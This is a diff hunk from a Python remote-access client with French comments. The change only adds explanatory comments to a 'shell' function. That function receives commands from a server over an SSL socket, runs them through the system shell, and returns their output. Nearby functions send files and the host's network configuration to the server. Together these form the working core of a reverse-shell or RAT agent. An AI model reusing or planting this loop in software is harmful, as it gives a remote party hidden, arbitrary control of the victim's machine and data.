@@ -22,12 +22,12 @@ def upload(ssl_socket):
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
     while True:
-        commande_shell_received = ssl_socket.recv(4096).decode()
-        if commande_shell_received.lower() == 'quit':
+        commande_shell_received = ssl_socket.recv(4096).decode() # Récupération de la commande Shell du serveur
+        if commande_shell_received.lower() == 'quit': # Gestion de la sortie du Shell
             break
-        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True)
-        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr
-        ssl_socket.send(commande_shell_to_send.encode())
+        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True) # Exécution de la commande Shell et stockage de ses sorties
+        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr # Concaténation des sorties de la commande Shell
+        ssl_socket.send(commande_shell_to_send.encode()) # Envoie de la réponse de la commande Shell
 
 # Fonction permettant d'envoyer la configuration réseau au serveur
 def ipconfig(ssl_socket):
